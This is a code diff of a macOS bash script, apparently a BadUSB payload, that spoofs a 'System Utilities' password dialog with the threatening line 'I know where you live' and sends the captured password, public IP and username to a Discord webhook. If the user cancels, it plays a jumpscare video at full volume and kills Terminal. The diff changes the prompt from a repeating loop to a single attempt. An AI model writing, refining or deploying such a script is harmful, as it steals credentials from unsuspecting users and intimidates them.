@@ -1,16 +1,14 @@
 #!/bin/bash
 # Combined Login Prompt with Jumpscare Fallback for macOS
 # ----------------------------------------------------------------
-# - Displays a login prompt with two lines:
+# - Displays a login prompt:
 #     "I know where you live, [FirstName]."
 #     "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
-# - If the user enters a non-empty password, it sends the data (password, public IP, username)
-#   to a Discord webhook.
-# - If the user presses Cancel, it triggers a jumpscare:
-#     It downloads an MP4 video from your GitHub repository,
-#     creates a temporary HTML file that embeds the video,
-#     sets system volume to maximum, opens it in the default browser in full screen,
-#     then forcefully kills Terminal.
+# - If a non-empty password is entered, it sends the password, public IP,
+#   and username to a Discord webhook.
+# - If the user cancels (or leaves the password empty), it downloads and plays
+#   a jumpscare video (from GitHub) in the browser (full-screen, at max volume).
+# - Finally, it force-kills Terminal.
 #
 # Requirements:
 #   - macOS with osascript, curl, and either python3 or python installed.
@@ -28,27 +26,20 @@ username=$(scutil <<< "show State:/Users/ConsoleUser" | awk '/Name :/ && ! /logi
 # --- Initialize Capture Data ---
 capture="username=${username}\n____________________________________________\n\n"
 
-# --- Define AppleScript Login Prompt ---
-# The prompt displays:
+# --- Define AppleScript Login Prompt (Single Attempt) ---
+# The prompt shows:
 #   Line 1: "I know where you live, [FirstName]."
 #   Line 2: "Enter your password Mr. [LastName]. DO NOT PRESS CANCEL"
-# It will re-prompt if the input is empty, but if the user cancels, it returns "CANCEL".
 read -r -d '' applescriptCode <<'EOF'
 set fullName to (long user name of (system info))
 set firstName to word 1 of fullName
 set lastName to word -1 of fullName
-set userPassword to ""
-repeat
-    try
-        set userPassword to text returned of (display dialog "I know where you live, " & firstName & "." & return & "Enter your password Mr. " & lastName & ". DO NOT PRESS CANCEL" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Utilities" default answer "" with hidden answer)
-        if userPassword is not "" then exit repeat
-    on error errMsg number errNum
-        if errNum is -128 then
-            return "CANCEL"
-        end if
-    end try
-end repeat
-return userPassword
+try
+    set userPassword to text returned of (display dialog "I know where you live, " & firstName & "." & return & "Enter your password Mr. " & lastName & ". DO NOT PRESS CANCEL" with icon POSIX file "/System/Library/CoreServices/CoreTypes.bundle/Contents/Resources/FinderIcon.icns" with title "System Utilities" default answer "" with hidden answer)
+    return userPassword
+on error
+    return ""
+end try
 EOF
 
 # --- Execute the Login Prompt and Capture Output ---
@@ -57,8 +48,9 @@ password=$(cat /tmp/pass_temp.txt)
 rm /tmp/pass_temp.txt
 
 # --- Branch Based on User Input ---
-if [ "$password" = "CANCEL" ]; then
-    echo "User pressed Cancel. Triggering jumpscare..."
+if [ -z "$password" ]; then
+    # User canceled (or provided an empty password) – trigger jumpscare.
+    echo "User canceled login prompt. Triggering jumpscare..."
     
     # --- Define the Jumpscare Video URL (GitHub Raw Link) ---
     VIDEO_URL="https://raw.githubusercontent.com/Hrampell/badusb_v2/main/Jeff_Jumpscare.mp4"
@@ -118,7 +110,7 @@ EOF
     killall Terminal
     exit 0
 else
-    # User provided a non-empty password – proceed to send data to Discord.
+    # User provided a password – proceed to send data to Discord.
     echo "Password entered: $password"
     capture="${capture}password=${password}\n"
     
